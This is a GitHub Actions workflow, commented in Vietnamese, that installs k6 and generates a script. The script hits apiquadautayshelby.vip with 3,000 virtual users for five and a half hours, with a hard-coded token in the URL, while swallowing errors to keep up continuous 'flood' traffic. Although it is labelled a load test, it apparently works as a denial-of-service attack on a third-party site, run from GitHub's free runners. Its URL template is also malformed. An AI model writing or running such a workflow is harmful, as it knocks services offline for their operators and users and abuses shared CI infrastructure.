name: K6 Peak Load Testing

on:
  workflow_dispatch: # Kích hoạt bằng tay từ giao diện Web GitHub

jobs:
  k6_load_test:
    name: Execute k6 Stress Test
    runs-on: ubuntu-latest
    
    env:
      ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION: 'true'

    steps:
    - name: Checkout Code
      uses: actions/checkout@v4

    - name: Setup K6 Performance Testing Tool (Sửa lỗi GPG)
      run: |
        # Sửa lỗi thiếu thư mục gpg và dirmngr trên máy chủ Ubuntu của GitHub
        sudo mkdir -p /root/.gnupg
        sudo chmod 700 /root/.gnupg
        sudo apt-get update
        sudo apt-get install -y gnupg dirmngr ca-certificates
        
        # Tiến hành cài đặt k6 chuẩn hóa
        sudo gpg --no-default-keyring --keyring /usr/share/keyrings/k6-archive-keyring.gpg --keyserver hkp://keyserver.ubuntu.com --recv-keys C5AD17C747E3415A3642D57D77C6C491D6AC1D69
        echo "deb [signed-by=/usr/share/keyrings/k6-archive-keyring.gpg] https://k6.io stable main" | sudo tee /etc/apt/sources.list.d/k6.list
        sudo apt-get update
        sudo apt-get install -y k6

    - name: Auto Generate Test Script File
      run: |
        cat << 'EOF' > load_test_run.js
        import http from 'k6/http';
        import { check, sleep } from 'k6';

        export const options = {
          scenarios: {
            github_peak_flood: {
              executor: 'constant-vus',
              vus: 3000,                // Ép cứng 3.000 người dùng ảo từ máy chủ GitHub
              duration: '5h30m',        // Chạy liên tục 5 tiếng 30 phút
            },
          },
        };

        const TOKEN = '05%2F7JlwSPGyw9zyLckWuhme1c4JqGT6pX1uSy1Ld66Ks0lsEnAmzaCPfHRaGMMhBj60RAomzqNVXQVdkJ%2FvGpaVowpSvKddd%2BBH0saRmaSfpII9yKGTouYzJkIX3r5OeMYWNimHnDfCophfzoCZZd634dab%2FvlFiVoMR3hDON8eKj8IAj3saw11dQOTZtiWa2pIyfnvizdXa3ZMpzjvZQZ4MZdYtJ5Kv%2FTR62yUfVNfAKuz6sPgOP7c6YndWVNK1nBOWGeV3QeGFde7BYqF4jjKnXMM%2BTde79%2FcNnVPSVQyOthFft6QiJOs75gGveb8oVN23gAVXLf%2B8WMun5ZmkQQ%3D%3D.79d5031f8b5c0a7602fef3a2fb61859e40f8aa46a81495dcfa50f8ebe04e280b';

        export default function () {
          try {
            const res1 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
            check(res1, { 'API OK': (r) => r.status === 200 || r.status === 401 });

            const res2 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
            check(res2, { 'New Hub OK': (r) => r.status !== 0 });

            const res3 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
            check(res3, { 'Old Hub OK': (r) => r.status !== 0 });
          } catch (err) {
            // Nuốt lỗi mạng để giữ nhịp bắn liên tục kịch sàn
          }
          sleep(0.05); 
        }
        EOF

    - name: Run k6 Performance Test
      run: k6 run load_test_run.js
